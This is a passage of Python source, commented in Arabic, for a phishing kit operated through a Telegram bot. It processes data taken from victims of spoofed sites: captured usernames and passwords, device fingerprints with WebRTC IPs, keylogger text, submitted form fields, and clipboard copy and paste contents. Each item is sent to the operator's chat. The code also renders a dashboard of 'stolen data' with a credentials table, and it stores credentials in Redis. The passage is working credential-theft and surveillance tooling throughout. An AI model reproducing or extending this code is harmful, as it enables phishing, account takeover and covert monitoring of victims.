                f"━━━━━━━━━━━━━━━━━━\n"
                f"🎉 تهانينا! يمكنك الآن استخدام هذه البيانات."
            )
            bot.send_message(cid, msg, parse_mode="Markdown")
            print(f"[+] CREDENTIALS CAPTURED: {site_key} | {username}")
        
        # ============================================================
        # بيانات الجهاز
        # ============================================================
        elif dtype == 'device':
            fp = data
            scr = fp.get('screen', {})
            hw = fp.get('hardware', {})
            bat = fp.get('battery', {})
            net = fp.get('network', {})
            gpu = fp.get('gpu', {})
            webrtc = fp.get('webrtc_ips', [])
            
            text = (
                f"🖥️ **بصمة جهاز الضحية**\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"🎯 الموقع المستهدف: **{site['name']}**\n\n"
                f"🌐 **IP:** `{source_ip}`\n"
                f"🕵️ **WebRTC IPs:** `{', '.join(webrtc) if webrtc else 'لا يوجد'}`\n\n"
                f"💻 **النظام:** `{fp.get('platform', 'N/A')}`\n"
                f"📱 **UA:** `{fp.get('ua', 'N/A')[:120]}`\n"
                f"🌍 **اللغة:** `{fp.get('lang', 'N/A')}`\n"
                f"🕐 **التوقيت:** `{fp.get('tz', 'N/A')}`\n\n"
                f"📐 **الشاشة:** `{scr.get('w', '?')}x{scr.get('h', '?')}` "
                f"(DPR `{scr.get('dpr', '?')}`)\n"
                f"⚙️ **المعالج:** `{hw.get('cores', 'N/A')} cores` | "
                f"RAM: `{hw.get('memory', 'N/A')} GB`\n"
                f"🎮 **GPU:** `{gpu.get('vendor', 'N/A')[:50]}`\n"
                f"🔋 **البطارية:** `{bat.get('level', 'N/A')}%`\n"
                f"📶 **الشبكة:** `{net.get('type', 'N/A')}`"
            )
            bot.send_message(cid, text, parse_mode="Markdown")
        
        # ============================================================
        # Keylogger
        # ============================================================
        elif dtype == 'keylog':
            text = data.get('text', '')
            if text.strip():
                bot.send_message(
                    cid,
                    f"⌨️ **لوحة المفاتيح ({site['name']}):**\n```\n{text[:500]}\n```",
                    parse_mode="Markdown"
                )
        
        # ============================================================
        # Form Submit
        # ============================================================
        elif dtype == 'form_submit':
            fields = data.get('fields', {})
            lines = [f"📝 **نموذج ({site['name']}):**"]
            for k, v in list(fields.items())[:20]:
                lines.append(f"• `{k}`: `{str(v)[:100]}`")
            bot.send_message(cid, "\n".join(lines), parse_mode="Markdown")
        
        # ============================================================
        # Clipboard
        # ============================================================
        elif dtype == 'clipboard_copy':
            content = data.get('content', '')
            if content:
                bot.send_message(cid, f"📋 **نسخ:**\n```\n{content[:300]}\n```", parse_mode="Markdown")
        
        elif dtype == 'clipboard_paste':
            content = data.get('content', '')
            if content:
                bot.send_message(cid, f"📥 **لصق:**\n```\n{content[:300]}\n```", parse_mode="Markdown")
    
    except Exception as e:
        print(f"[-] _handle_sh_data error ({dtype}): {e}")
        import traceback
        traceback.print_exc()


# ============================================================
# [7] لوحة عرض (ويب)
# ============================================================
def render_dashboard(session_id, sess):
    site = SUPPORTED_SITES.get(sess.get("target_site", "facebook"), {})
    creds = sess.get("captured_credentials", [])
    
    cred_rows = ""
    for c in creds:
        cred_rows += f'''
        <tr>
            <td><code>{c.get('username', '')}</code></td>
            <td><code>{c.get('password', '')}</code></td>
            <td>{time.strftime('%H:%M:%S', time.localtime(c.get('captured_at', 0)))}</td>
        </tr>'''
    
    html = f"""<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<title>Session Dashboard</title>
<style>
  body {{ font-family: -apple-system, sans-serif; background: #0f172a; color: #f8fafc;
    margin: 0; padding: 24px; }}
  .c {{ max-width: 900px; margin: 0 auto; }}
  h1 {{ color: {site.get('color', '#38bdf8')}; }}
  .card {{ background: #1e293b; border-radius: 12px; padding: 20px;
    margin-bottom: 16px; border: 1px solid #334155; }}
  table {{ width: 100%; border-collapse: collapse; font-size: 13px; }}
  th {{ text-align: right; padding: 10px; border-bottom: 1px solid #334155;
    color: #64748b; font-weight: 600; }}
  td {{ padding: 10px; border-bottom: 1px solid #1e293b; }}
  code {{ background: #0f172a; padding: 3px 8px; border-radius: 4px;
    color: #4ade80; font-family: monospace; font-size: 12px; word-break: break-all; }}
</style>
</head>
<body>
<div class="c">
  <h1>🎯 {site.get('name', 'Session')} — لوحة التحكم</h1>
  <div class="card">
    <p><b>🆔:</b> <code>{session_id}</code></p>
    <p><b>👤 Chat:</b> <code>{sess.get('chat_id')}</code></p>
    <p><b>🌐 IP:</b> <code>{sess.get('captured_ip', 'N/A')}</code></p>
    <p><b>📄 صفحات:</b> {sess.get('page_views', 0)}</p>
  </div>
  <div class="card">
    <h2>🔐 البيانات المسروقة ({len(creds)})</h2>
    <table>
      <tr><th>المستخدم</th><th>كلمة السر</th><th>الوقت</th></tr>
      {cred_rows if cred_rows else '<tr><td colspan="3" style="text-align:center">لا توجد بيانات بعد</td></tr>'}
    </table>
  </div>
</div>
</body>
</html>"""
    return html, 200


# ============================================================
# [8] لوحة تحكم البوت
# ============================================================
def build_sh_panel(session_id, chat_id):
    from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
    m = InlineKeyboardMarkup()
    m.row(
        InlineKeyboardButton("📋 البيانات المسروقة", callback_data=f"sh_creds_{session_id}"),
        InlineKeyboardButton("📊 إحصائيات", callback_data=f"sh_stats_{session_id}"),
    )
    m.row(
        InlineKeyboardButton("🌐 عرض الويب", url=f"{RAILWAY_URL}/sh_view?s={session_id}"),
    )
    return m


# ============================================================
# [9] API للبوت
# ============================================================
def get_sh_data(session_id):
    """يرجع بيانات الجلسة"""
    result = {"credentials": [], "session": None}
    
    sess = get_session(session_id)
    if sess:
        result["credentials"] = sess.get("captured_credentials", [])
        result["session"] = {
            "chat_id": sess.get("chat_id"),
            "target_site": sess.get("target_site"),
            "page_views": sess.get("page_views", 0),
            "ip": sess.get("captured_ip"),
            "created_at": sess.get("created_at"),
            "last_seen": sess.get("last_seen"),
        }
    
    if redis_client:
        try:
            creds_raw = redis_client.lrange(f"sh_creds:{session_id}", 0, -1)
            for c in (creds_raw or []):
                try:
                    result["credentials"].append(json.loads(c))
                except Exception:
                    pass
        except Exception as e:
            print(f"[-] get_sh_data error: {e}")
    
    return result
